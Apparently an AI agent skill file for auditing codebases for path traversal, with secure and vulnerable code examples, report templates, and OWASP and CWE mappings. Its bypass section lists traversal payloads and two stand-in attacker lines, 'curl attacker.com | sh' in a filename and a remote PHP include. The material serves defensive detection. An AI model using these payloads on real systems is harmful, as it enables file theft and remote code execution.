# Path Traversal Detection

[ref: #pathtraversal-detection]

You are performing a focused security assessment to find path traversal vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find file-loading sinks with dynamic paths), **batched verify** (trace user input and check mitigations in parallel batches of 3), and **merge** (consolidate batch results into one report).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is Path Traversal

Path traversal (also called directory traversal) occurs when user-supplied input is incorporated into a file path that is then used to read, write, or serve files from the filesystem — without properly constraining the resulting path to an intended base directory. An attacker can supply sequences like `../` or encoded variants (`%2e%2e%2f`, `..%2f`, `%2e%2e/`) to escape the intended directory and access arbitrary files such as `/etc/passwd`, application source code, credentials, or private keys.

The core pattern: *unvalidated user input reaches a filesystem operation and the resolved path is not verified to remain within the intended base directory.*

### What Path Traversal IS

- Serving a user-requested filename directly from a base directory without canonicalizing and checking the resulting path:
  `open(os.path.join(BASE_DIR, user_filename))`
- Constructing a file path from a URL parameter and passing it to a file-read function:
  `fs.readFile(path.join(__dirname, req.query.file), ...)`
- Template rendering or include directives driven by user input:
  `include($_GET['page'] . '.php')`
- Archive extraction (`ZipFile`, `tarfile`, `zipslip`) where entry names are used as output paths without stripping `../` components
- Using `send_file()` / `send_from_directory()` / `res.sendFile()` with an unsanitized user-controlled path
- Reading a file whose path is derived from a user-controlled database value that was stored without sanitization

### What Path Traversal is NOT

Do not flag these as path traversal:

- **SSRF**: Fetching a remote URL from user input — that is Server-Side Request Forgery, a separate class
- **RCE via file write**: Writing attacker-controlled content to an arbitrary path — related but a different impact class (flag as RCE or File Upload)
- **Static file serving**: Serving files from a path that is entirely hardcoded with no user influence
- **Safe path joins followed by realpath + prefix check**: The code computes `realpath()` and verifies it starts with the intended base directory
- **basename() before join**: Using only the filename component strips traversal sequences (though note this prevents directory selection, not just traversal)

### Patterns That Prevent Path Traversal

When you see these mitigations applied **before** the file operation, the code is likely **not vulnerable**:

**1. `realpath` / `resolve` followed by a base-directory prefix check (most robust fix)**
```python
# Python
import os
BASE = '/var/www/files'
safe_path = os.path.realpath(os.path.join(BASE, user_input))
if not safe_path.startswith(BASE + os.sep):
    raise PermissionError("Path escape detected")
with open(safe_path) as f:
    ...
```

```javascript
// Node.js
const BASE = path.resolve('/var/www/files');
const resolved = path.resolve(BASE, req.query.file);
if (!resolved.startsWith(BASE + path.sep)) {
    return res.status(403).send('Forbidden');
}
fs.readFile(resolved, ...);
```

```java
// Java
Path base = Paths.get("/var/www/files").toRealPath();
Path resolved = base.resolve(userInput).normalize();
if (!resolved.startsWith(base)) {
    throw new SecurityException("Path escape");
}
Files.readAllBytes(resolved);
```

**2. `basename()` / `path.basename()` to strip directory components**
```python
# Python — strips all directory parts, only the filename remains
filename = os.path.basename(user_input)
with open(os.path.join(BASE, filename)) as f:
    ...
```

```php
// PHP
$filename = basename($_GET['file']);
readfile('/var/www/uploads/' . $filename);
```

**3. Allowlist of permitted filenames or extensions**
```python
ALLOWED = {'report.pdf', 'manual.txt', 'logo.png'}
if user_input not in ALLOWED:
    abort(400)
with open(os.path.join(BASE, user_input)) as f:
    ...
```

**4. Framework-provided safe file serving**
```python
# Flask — send_from_directory validates the path stays within the directory
return send_from_directory('/var/www/files', filename)

# Django — FileResponse with a path that was never user-controlled
```

---

## Vulnerable vs. Secure Examples

### Python — Flask

```python
# VULNERABLE: user-controlled filename joined without realpath check
@app.route('/download')
def download():
    filename = request.args.get('file')
    filepath = os.path.join('/var/www/files', filename)
    return send_file(filepath)

# SECURE: resolve and verify the path stays within the base directory
@app.route('/download')
def download():
    filename = request.args.get('file')
    base = os.path.realpath('/var/www/files')
    filepath = os.path.realpath(os.path.join(base, filename))
    if not filepath.startswith(base + os.sep):
        abort(403)
    return send_file(filepath)
```

### Python — FastAPI

```python
# VULNERABLE: path parameter used directly in file read
@app.get('/file/{name}')
async def get_file(name: str):
    return FileResponse(f'/app/static/{name}')

# SECURE: basename strips traversal sequences
@app.get('/file/{name}')
async def get_file(name: str):
    safe_name = os.path.basename(name)
    return FileResponse(os.path.join('/app/static', safe_name))
```

### Node.js — Express

```javascript
// VULNERABLE: req.query.file used directly in readFile
app.get('/file', (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.query.file);
  fs.readFile(filePath, (err, data) => res.send(data));
});

// SECURE: resolve and check prefix
app.get('/file', (req, res) => {
  const base = path.resolve(__dirname, 'uploads');
  const filePath = path.resolve(base, req.query.file);
  if (!filePath.startsWith(base + path.sep)) {
    return res.status(403).send('Forbidden');
  }
  fs.readFile(filePath, (err, data) => res.send(data));
});
```

### PHP

```php
// VULNERABLE: direct inclusion of user input
<?php
$page = $_GET['page'];
include($page . '.php');

// VULNERABLE: readfile with unsanitized path
$file = $_GET['file'];
readfile('/var/www/uploads/' . $file);

// SECURE: basename strips directory components
$file = basename($_GET['file']);
readfile('/var/www/uploads/' . $file);

// SECURE: realpath + prefix check
$base = realpath('/var/www/uploads');
$path = realpath($base . '/' . $_GET['file']);
if ($path === false || strpos($path, $base . DIRECTORY_SEPARATOR) !== 0) {
    http_response_code(403);
    exit;
}
readfile($path);
```

### Ruby on Rails

```ruby
# VULNERABLE: params[:file] used directly in file read
def show
  file_path = Rails.root.join('public', 'reports', params[:file])
  send_file file_path
end

# SECURE: basename only
def show
  safe_name = File.basename(params[:file])
  send_file Rails.root.join('public', 'reports', safe_name)
end
```

### Java — Spring

```java
// VULNERABLE: path variable used directly to read file
@GetMapping("/file/{name}")
public ResponseEntity<Resource> getFile(@PathVariable String name) throws IOException {
    Path filePath = Paths.get("/var/www/files").resolve(name);
    Resource resource = new UrlResource(filePath.toUri());
    return ResponseEntity.ok(resource);
}

// SECURE: normalize and check prefix
@GetMapping("/file/{name}")
public ResponseEntity<Resource> getFile(@PathVariable String name) throws IOException {
    Path base = Paths.get("/var/www/files").toRealPath();
    Path resolved = base.resolve(name).normalize();
    if (!resolved.startsWith(base)) {
        return ResponseEntity.status(403).build();
    }
    Resource resource = new UrlResource(resolved.toUri());
    return ResponseEntity.ok(resource);
}
```

### Go

```go
// VULNERABLE: query param joined directly to base directory
func fileHandler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("file")
    http.ServeFile(w, r, filepath.Join("/var/www/files", name))
}

// SECURE: filepath.Clean + prefix check
func fileHandler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("file")
    base := "/var/www/files"
    clean := filepath.Join(base, filepath.Clean("/"+name))
    if !strings.HasPrefix(clean, base+string(os.PathSeparator)) {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }
    http.ServeFile(w, r, clean)
}
```

### C# — ASP.NET Core

```csharp
// VULNERABLE: user-controlled filename used directly in file read
[HttpGet("download")]
public IActionResult Download(string file)
{
    var path = Path.Combine("/var/www/files", file);
    return File(System.IO.File.OpenRead(path), "application/octet-stream");
}

// SECURE: Path.GetFullPath + base-directory prefix check
[HttpGet("download")]
public IActionResult Download(string file)
{
    var basePath = Path.GetFullPath("/var/www/files");
    var resolved = Path.GetFullPath(Path.Combine(basePath, file));
    if (!resolved.StartsWith(basePath + Path.DirectorySeparatorChar))
    {
        return Forbid();
    }
    return File(System.IO.File.OpenRead(resolved), "application/octet-stream");
}
```

### Archive Extraction (ZipSlip)

```python
# VULNERABLE: ZipSlip — zip entry names can contain ../
import zipfile
with zipfile.ZipFile(user_zip) as zf:
    zf.extractall('/var/www/uploads')

# SECURE: validate each entry path stays within the target directory
import zipfile, os
base = os.path.realpath('/var/www/uploads')
with zipfile.ZipFile(user_zip) as zf:
    for member in zf.namelist():
        target = os.path.realpath(os.path.join(base, member))
        if not target.startswith(base + os.sep):
            raise ValueError(f"ZipSlip detected: {member}")
    zf.extractall(base)
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Find File-Loading Sinks With Dynamic Paths

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where a file is opened, read, served, or extracted using a dynamically constructed path — meaning the path (or a component of it) is stored in a variable rather than being a fully hardcoded string. Write results to `{{ REPORTS_ROOT }}/12_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, web framework, file-serving patterns, and any file upload or download features.
>
> **What to search for — file-loading sinks with dynamic path components**:
>
> Flag any call to a file-reading/serving function where the path argument contains a variable (regardless of where the variable comes from). You are **not** tracing user input in this phase — that is Phase 2's job. Just find all dynamic file access patterns.
>
> 1. **Direct file open / read calls with a variable path**:
>    - Python: `open(var)`, `open(os.path.join(..., var))`, `pathlib.Path(var).read_text()`, `pathlib.Path(var).read_bytes()`
>    - Node.js: `fs.readFile(var, ...)`, `fs.readFileSync(var)`, `fs.createReadStream(var)`
>    - PHP: `file_get_contents(var)`, `fopen(var, ...)`, `readfile(var)`, `include(var)`, `require(var)`, `include_once(var)`, `require_once(var)`
>    - Ruby: `File.read(var)`, `File.open(var)`, `IO.read(var)`, `IO.binread(var)`
>    - Java: `new FileInputStream(var)`, `new File(var)`, `Files.readAllBytes(Paths.get(var))`, `Files.newInputStream(path)`
>    - Go: `os.Open(var)`, `os.ReadFile(var)`, `ioutil.ReadFile(var)`, `os.OpenFile(var, ...)`
>    - C#: `File.ReadAllText(var)`, `File.ReadAllBytes(var)`, `new FileStream(var, ...)`, `System.IO.File.Open(var, ...)`
>
> 2. **Framework file-serving calls with a variable path**:
>    - Flask: `send_file(var)`, `send_from_directory(base, var)`
>    - FastAPI / Starlette: `FileResponse(var)`
>    - Django: `FileResponse(open(var, 'rb'))`, `StreamingHttpResponse` over an opened file
>    - Express: `res.sendFile(var)`, `res.download(var)`, `express.static` with dynamic root
>    - Spring: `new UrlResource(path.toUri())`, `ResourceLoader.getResource(var)`, `ClassPathResource(var)`
>    - Rails: `send_file var`, `render file: var`
>    - Go: `http.ServeFile(w, r, var)`, `http.ServeContent(w, r, var, ...)`
>
> 3. **Path construction functions where at least one component is a variable**:
>    - `os.path.join(BASE, var)`, `os.path.join(var1, var2)`
>    - `path.join(__dirname, var)`, `path.resolve(base, var)`
>    - `Paths.get(base).resolve(var)`
>    - `filepath.Join(base, var)`
>    - String concatenation used as a path: `BASE + var`, `f"{BASE}/{var}"`, `` `${base}/${var}` ``
>
> 4. **Archive extraction with user-supplied archives** (ZipSlip pattern):
>    - Python: `zipfile.ZipFile.extractall(...)`, `tarfile.TarFile.extractall(...)`
>    - Java: `ZipEntry.getName()` used as an output path
>    - Node.js: `unzipper`, `adm-zip`, `node-tar` extraction calls
>    - Go: `archive/zip` or `archive/tar` extraction without entry-name validation
>
> **What to skip** (these have no dynamic path component — do not flag):
> - File paths that are fully hardcoded string literals with no variable parts
> - Paths derived entirely from server-side config / environment variables with no user-supplied component (e.g., `open(settings.LOG_FILE)` where `LOG_FILE` is a config value)
> - Framework built-in static file middleware where the root directory is hardcoded (e.g., `express.static('public')` with a fixed root)
>
> **Output format** — write to `{{ REPORTS_ROOT }}/12_recon.md`:
>
> ```markdown
> # Path Traversal Recon: [Project Name]
>
> ## Summary
> Found [N] locations where files are accessed using dynamically constructed paths.
>
> ## File-Loading Sinks
>
> ### 1. [Descriptive name — e.g., "Dynamic readFile in download endpoint"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Sink**: [open / fs.readFile / send_file / include / FileInputStream / etc.]
> - **Path construction**: [os.path.join / path.join / string concat / f-string / etc.]
> - **Dynamic variable(s)**: `var_name` — [brief note on what it appears to represent, e.g., "looks like a filename from request" or "unknown origin"]
> - **Code snippet**:
>   ```
>   [the path construction + file operation call]
>   ```
>
> [Repeat for each sink]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/12_recon.md`. If the recon found **zero file-loading sinks** (the summary reports "Found 0" or the "File-Loading Sinks" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/12_pathtraversal.md`, then delete `{{ REPORTS_ROOT }}/12_recon.md`, and stop:

```markdown
# Path Traversal Analysis Results

No vulnerabilities found.
```

Only proceed to Phase 2 if Phase 1 found at least one file-loading sink.

### Phase 2: Verify — Trace Taint and Check Mitigations (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/12_recon.md` and split the file-loading sinks into **batches of up to 3 sinks each**. Launch **one subagent per batch in parallel**. Each subagent analyzes only its assigned sinks and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `{{ REPORTS_ROOT }}/12_recon.md` and count the numbered sink sections (`### 1.`, `### 2.`, etc.).
2. Divide them into batches of up to 3. For example, 8 sinks → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those sink sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sinks.
5. Each subagent writes to `{{ REPORTS_ROOT }}/12_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above (and "Patterns That Prevent Path Traversal" / "What Path Traversal is NOT" as reference). For example, if the project uses Node.js/Express, include the "Node.js — Express" block. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned file-loading sink, determine whether a user-supplied value reaches the dynamic path variable AND whether any mitigation prevents the path from escaping the intended base directory. Our goal is to find path traversal vulnerabilities. Write results to `{{ REPORTS_ROOT }}/12_batch_[N].md`.
>
> **Your assigned sinks** (from the recon phase):
>
> [Paste the full text of the assigned sink sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, and how data flows through the application.
>
> **Path traversal reference** — what to look for:
>
> User-supplied input incorporated into a filesystem path without constraining the resolved path to an intended base directory (including ZipSlip-style archive extraction). Do **not** flag SSRF, pure RCE/file-write classes, fully hardcoded paths, or safe `realpath`/`resolve` + base prefix checks as path traversal (see the skill's "What Path Traversal is NOT" and "Patterns That Prevent Path Traversal" sections in the main skill document if needed).
>
> **For each sink, perform two checks**:
>
> **Check A — Is the path variable user-controlled?**
>
> Trace the dynamic variable(s) backwards to their origin:
>
> 1. **Direct user input** — the variable is assigned directly from a request source:
>    - HTTP query params: `request.GET.get(...)`, `req.query.x`, `params[:x]`, `$_GET['x']`, `c.Query("x")`
>    - Path parameters: `request.path_params['name']`, `req.params.name`, `params[:name]`, `c.Param("name")`
>    - Request body / form fields: `request.POST.get(...)`, `req.body.x`, `params[:x]`, `$_POST['x']`
>    - HTTP headers: `request.headers.get(...)`, `req.headers['x']`
>    - Cookies: `request.COOKIES.get(...)`, `req.cookies.x`
>    - Multipart filename: `file.filename`, `req.file.originalname`, `$_FILES['file']['name']`
>
> 2. **Indirect user input** — the variable is derived from user input through transformations, intermediate assignments, or function calls. Trace the full chain:
>    - Variable assigned from a helper function → check the function's source
>    - Variable passed as an argument → check all call sites
>    - Variable read from a database value that was originally stored from user input
>
> 3. **Server-side / hardcoded value** — the variable comes from config, an environment variable, a hardcoded constant, or server-side logic with no user influence — this sink is NOT exploitable via path traversal.
>
> **Check B — Is path escape prevented by an effective mitigation?**
>
> Even if user input reaches the path, the following mitigations prevent traversal. Check whether they are applied **before** the file operation and applied **correctly**:
>
> - **`realpath` / `os.path.realpath()` + base-directory prefix check**: resolves symlinks and `..` sequences, then verifies the result starts with the intended base. This is the strongest fix.
>   - `os.path.realpath(path).startswith(BASE + os.sep)` — effective ✓
>   - `os.path.realpath(path).startswith(BASE)` without trailing separator — potentially bypassable if BASE is a prefix of another directory name ✗
> - **`path.resolve()` + `startsWith(base + sep)`** (Node.js) — effective ✓
> - **`Paths.get(...).normalize()` + `startsWith(base)`** (Java) — effective only if `base` was also obtained via `toRealPath()` ✓
> - **`filepath.Clean()` + `strings.HasPrefix(clean, base+sep)`** (Go) — effective ✓
> - **`basename()` / `path.basename()` / `File.basename()`** — strips all directory components; effective at preventing traversal but prevents subdirectory access
> - **Allowlist of permitted filenames** — fully effective if the allowlist is strict and the input is compared against it before use
> - **Framework `send_from_directory`** (Flask) — Flask's `send_from_directory` internally calls `safe_join` which raises an error on traversal; effective ✓
>
> Mitigations that are **insufficient**:
> - Stripping `../` with a simple `replace('../', '')` — bypassable with `....//` or URL encoding
> - Checking that input does not start with `/` — does not prevent relative traversal
> - Using `os.path.join` alone without `realpath` — `os.path.join('/base', '../etc/passwd')` still produces `/etc/passwd`
> - URL-decoding the input once — attackers can double-encode: `%252e%252e%252f` → `%2e%2e%2f` → `../`
> - Type validation (e.g., checking the extension is `.pdf`) without a path escape check — an attacker can use `../../etc/passwd%00.pdf` (null-byte) on older systems or frame the path to have the right extension at the end
>
> **Vulnerable vs. secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the path variable AND no effective mitigation is in place before the file operation.
> - **Likely Vulnerable**: User input probably reaches the path variable (indirect flow), or a weak/incomplete mitigation is present (e.g., `replace('../', '')`, no trailing-separator in prefix check).
> - **Not Vulnerable**: The path variable is server-side only, OR an effective mitigation (`realpath` + prefix check, `basename`, strict allowlist, safe framework helper) is correctly applied.
> - **Needs Manual Review**: Cannot determine the variable's origin with confidence (passes through opaque helpers or complex conditional flows), or the mitigation logic is non-standard and hard to evaluate statically.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/12_batch_[N].md`:
>
> ```markdown
> # Path Traversal Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "HTTP query param `file` flows directly into os.path.join without realpath check"]
> - **Taint trace**: [Step-by-step from entry point to the file operation]
> - **Missing mitigation**: [What check is absent]
> - **Impact**: Read arbitrary files accessible to the process user, including `/etc/passwd`, application config, source code, private keys.
> - **Remediation**: [Specific fix]
> - **Dynamic Test**:
>   ```
>   [curl command or payload to confirm; show traversal and encoded variants as appropriate]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Issue**: [e.g., "Variable likely sourced from user input via helper" or "Weak mitigation: strips ../ but bypassable with ....//"]
> - **Taint trace**: [Best-effort trace with the uncertain step identified]
> - **Concern**: [Why it remains a risk despite partial mitigation]
> - **Remediation**: [Apply realpath + prefix check or basename before joining]
> - **Dynamic Test**:
>   ```
>   [payloads to attempt bypass of the partial mitigation]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "Path is derived entirely from server-side config" or "os.path.realpath() + prefix check correctly applied"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why the variable's origin or mitigation could not be determined]
> - **Suggestion**: [What to trace manually]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/12_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/12_pathtraversal.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/12_batch_1.md`, `{{ REPORTS_ROOT }}/12_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged report to `{{ REPORTS_ROOT }}/12_pathtraversal.md` using this format:

```markdown
# Path Traversal Analysis Results: [Project Name]

## Executive Summary
- Sinks analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/12_pathtraversal.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/12_batch_*.md`).

---

## OWASP API Security Top 10 2023 mapping

Path traversal is not a standalone OWASP API Security Top 10 2023 category, but it enables or strongly overlaps with several API risks. This scan supports the following mappings:

### API1:2023 — Broken Object Level Authorization

| Aspect | Mapping |
|---|---|
| **OWASP citation** | "Every API endpoint that receives an ID of an object, and performs any action on the object, should implement object-level authorization checks. The checks should validate that the logged-in user has permissions to perform the requested action on the requested object." |
| **Path-traversal relationship** | When an API uses a file ID, path, or filename as the object identifier (e.g., `/files/{name}` or `/download?file={name}`), missing ownership checks let an attacker access another user's files by guessing or manipulating the path. |
| **How this scan detects it** | The recon phase finds file-loading sinks whose dynamic component is derived from a request parameter; the verify phase checks whether the code also verifies that the resolved path belongs to the authenticated principal (tenant, user, or session) before reading it. |
| **Risk table** | Threat agents: API specific, exploitability **Easy**; Weakness prevalence **Widespread**, detectability **Easy**; Impact: technical **Moderate**, business specific. |

### API8:2023 — Security Misconfiguration

| Aspect | Mapping |
|---|---|
| **OWASP citation** | "Security misconfiguration can happen at any level of the API stack... Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options." |
| **Path-traversal relationship** | Unsafe defaults and missing sandboxing are common root causes: serving files from the application root, disabling path validation, enabling directory listing, extracting archives to predictable locations, or running the process as a privileged user. |
| **How this scan detects it** | The recon phase flags dynamic file-serving and archive-extraction sinks; the verify phase checks for canonical path validation, sandboxing, and least-privilege process configuration. |
| **Risk table** | Threat agents: API specific, exploitability **Easy**; Weakness prevalence **Widespread**, detectability **Easy**; Impact: technical **Severe**, business specific. |

### API10:2023 — Unsafe Consumption of APIs

| Aspect | Mapping |
|---|---|
| **OWASP citation** | "Developers tend to trust data received from third-party APIs more than user input... does not properly validate and sanitize data gathered from other APIs prior to processing it or passing it to downstream components." |
| **Path-traversal relationship** | A downstream API, webhook, or third-party service may return filenames, object keys, URLs, or archive entries that contain traversal sequences. Passing these values directly into local filesystem operations (`open`, `send_file`, `extractall`) causes traversal. |
| **How this scan detects it** | The verify phase traces the dynamic path variable backward through HTTP clients, webhooks, message queues, and database records to determine whether the value originated from an external API and whether it was sanitized before use. |
| **Risk table** | Threat agents: API specific, exploitability **Easy**; Weakness prevalence **Common**, detectability **Average**; Impact: technical **Severe**, business specific. |

---

## CWE Mapping

Path traversal findings should be tagged with the most specific CWE that applies. Use the parent CWE-22 when the exact variant is unknown, and add the child CWE when the bypass mechanism is identifiable.

| CWE | Name | When to use |
|---|---|---|
| [CWE-22](https://cwe.mitre.org/data/definitions/22.html) | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | General path-traversal finding where the precise variant is not determined. |
| [CWE-23](https://cwe.mitre.org/data/definitions/23.html) | Relative Path Traversal | The payload uses `../`, `..\`, encoded dots, or relative sequences to escape the base directory. |
| [CWE-36](https://cwe.mitre.org/data/definitions/36.html) | Absolute Path Traversal | The payload supplies an absolute path (`/etc/passwd`, `C:\Windows\win.ini`) that is used directly. |
| [CWE-73](https://cwe.mitre.org/data/definitions/73.html) | External Control of File Name or Path | User input controls the filename or a path component, even if no traversal is present (often paired with CWE-22). |
| [CWE-20](https://cwe.mitre.org/data/definitions/20.html) | Improper Input Validation | The application fails to validate or sanitize the path input before use. |
| [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | Exposure of Sensitive Information to an Unauthorized Actor | The traversal leaks source code, credentials, private keys, or user data. |
| [CWE-918](https://cwe.mitre.org/data/definitions/918.html) | Server-Side Request Forgery (SSRF) | A path-handling function also fetches URLs and the attacker supplies `file:///etc/passwd` or a redirect. |
| [CWE-78](https://cwe.mitre.org/data/definitions/78.html) | OS Command Injection | A filename or path containing shell metacharacters is passed to `system()`, `exec()`, `os.system()`, or archive utilities. |
| [CWE-94](https://cwe.mitre.org/data/definitions/94.html) | Improper Control of Code Generation ('Code Injection') | PHP `include`/`require` loads and executes attacker-controlled code (RFI/LFI). |
| [CWE-22](https://cwe.mitre.org/data/definitions/22.html) → [CWE-35](https://cwe.mitre.org/data/definitions/35.html) | Path Traversal: '.../...//' | Nested traversal sequences such as `....//` or `....\\` used to bypass simple filters. |
| [CWE-41](https://cwe.mitre.org/data/definitions/41.html) | Improper Resolution of Path Equivalence | Equivalent path representations (`%2e%2e%2f`, overlong UTF-8, Unicode normalization) resolve differently than the validation logic expects. |
| [CWE-59](https://cwe.mitre.org/data/definitions/59.html) | Improper Link Resolution Before File Access ('Following Symbolic Links') | Symlink following bypasses prefix checks that do not use `realpath()`/`GetFullPath()`. |
| [CWE-362](https://cwe.mitre.org/data/definitions/362.html) | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') | TOCTOU between the prefix check and the file open, or predictable temp-path races. |
| [CWE-611](https://cwe.mitre.org/data/definitions/611.html) | Improper Restriction of XML External Entity Reference ('XXE') | XML parsers resolve external entities as file paths; flag under the security-audit XXE reference, not here. |
| [CWE-641](https://cwe.mitre.org/data/definitions/641.html) | Improper Restriction of Names for Files and Other Resources | Archive entry names or multipart filenames are not restricted before use. |
| [CWE-770](https://cwe.mitre.org/data/definitions/770.html) | Allocation of Resources Without Limits or Throttling | Unbounded file reads or archive extraction causing DoS; note in finding impact. |

---

## Attack Variants & Bypass Patterns

Path traversal is not limited to `../` in a URL parameter. Subagents must recognize the following variants and bypass patterns, and must classify each finding with the appropriate CWE.

### Relative and Encoded Traversal

The classic payload uses dot-dot-slash sequences to climb out of the intended directory. Encoded forms bypass string-based filters:

| Payload | Decoded / resolved form | CWE |
|---|---|---|
| `../../../etc/passwd` | `../../../etc/passwd` | CWE-23 |
| `..%2f..%2f..%2fetc%2fpasswd` | `../../../etc/passwd` | CWE-23 / CWE-41 |
| `%2e%2e%2f%2e%2e%2fetc%2fpasswd` | `../../etc/passwd` | CWE-23 / CWE-41 |
| `%252e%252e%252f...` | `%2e%2e%2f...` → `../...` | CWE-23 / CWE-41 |
| `....//....//....//etc/passwd` | `../../../etc/passwd` | CWE-35 |
| `..%c0%af..%c0%afetc/passwd` (overlong UTF-8 `/`) | `../` on vulnerable decoders | CWE-41 |
| `..%ef%bc%8f` (full-width slash `／`) | Normalizes to `/` on some stacks | CWE-41 |

Subagents must treat any of the above as path traversal when they reach a filesystem sink, even if a naive `replace('../','')` filter is present.

### Absolute Path Traversal

The application accepts an absolute path and uses it directly, or joins it to a base directory in a way that preserves the absolute root:

```
GET /download?file=/etc/passwd
GET /download?file=C:\Windows\win.ini
```

`os.path.join('/base', '/etc/passwd')` returns `/etc/passwd` on Unix; `Path.Combine(@"C:\base", @"C:\Windows\win.ini")` returns `C:\Windows\win.ini` on Windows. This is **CWE-36**.

### `file://` SSRF / URL-to-Path Confusion

Some file-handling helpers accept both local paths and remote URLs. If the code passes user input to an HTTP client, URL fetcher, or document converter, the attacker may supply:

```
file:///etc/passwd
file://localhost/etc/passwd
file:///proc/self/environ
```

This overlaps with SSRF (CWE-918). Flag it under the security-audit SSRF reference when the sink is a network request; flag it here when the sink is a file-read function that internally resolves URLs.

### Open Redirect via Path

A user-controlled path used in a redirect or forward can leak to an attacker-controlled host or internal service:

```python
return redirect('/static/' + request.args.get('file'))
# attacker: ?file=//attacker.com/malware.exe
```

Although the primary impact is open redirect, the same sink may later be used for path traversal if the redirect target is read back by a downstream component. Note both possibilities.

### Cloud-Storage / S3 Object-Key Traversal

Applications that treat S3, GCS, Azure Blob, or MinIO object keys as filesystem paths may be vulnerable when keys contain `../`, null bytes, or control characters. SDKs usually reject keys with `../`, but custom pre-signing or proxy logic may not:

```python
key = f"uploads/{user_id}/{filename}"
s3.get_object(Bucket=BUCKET, Key=key)
```

If `filename` is `../../private-object`, the application may read another tenant's object. Also check for:
- Key prefixes used in listing operations without tenant isolation.
- Client-side path normalization that differs from the cloud provider's rules.

### Absolute-Path Archive Extraction (ZipSlip variants)

ZipSlip is not limited to relative `../` sequences. Archive entries may also specify absolute paths:

```
/etc/cron.d/malicious
C:\Windows\System32\evil.dll
\\?\C:\Windows\System32\evil.dll   (Windows extended path)
```

Subagents must flag any extraction that:
- Uses `ZipEntry.getName()` / `namelist()` as an output path without validation.
- Does not reject absolute paths.
- Does not verify the resolved entry path stays within the target directory.
- Extracts with elevated privileges or into a directory writable by other users.

### OS Command Injection via Malicious Filenames

Filenames are often assumed safe, but when passed to shell commands or archive utilities they become command injection vectors:

```python
os.system(f"unzip -o {zip_path} -d {out_dir}")
# filename inside zip: `; curl attacker.com | sh #.txt`
```

Check for:
- `system()`, `exec()`, `popen()`, `subprocess.call(shell=True)` with path/filename arguments.
- Archive tools invoked with user-controlled filenames (`tar`, `unzip`, `7z`, `zipinfo`).
- Filename containing backticks, `$()`, semicolons, newlines, or quotes.

Tag the finding with CWE-78 in addition to CWE-22/73 when command execution is reachable.

### RFI (Remote File Inclusion) and LFI

PHP `include` / `require` can load both local files and remote URLs when `allow_url_include` is enabled:

```php
include($_GET['page']);          // LFI → ../../etc/passwd
include("http://attacker.com/shell.txt");  // RFI
```

LFI is a path-traversal variant (CWE-22/23/36). RFI is code execution (CWE-94). Subagents must note which one applies based on the configuration and payload.

### Null-Byte Truncation

Older PHP, Java, and C runtimes truncate strings at the null byte (`%00`, `0x00`). An attacker can append a fake extension:

```
GET /download?file=../../../etc/passwd%00.jpg
```

Modern language runtimes generally ignore or reject embedded null bytes, but filesystem APIs, native libraries, and serialization layers may still honor them. Always test `%00` when the runtime or a native binding is involved.

### Unicode and Overlong-UTF-8 Normalization Bypasses

Validation logic and the filesystem may interpret the same byte sequence differently:

| Technique | Example | Typical effect |
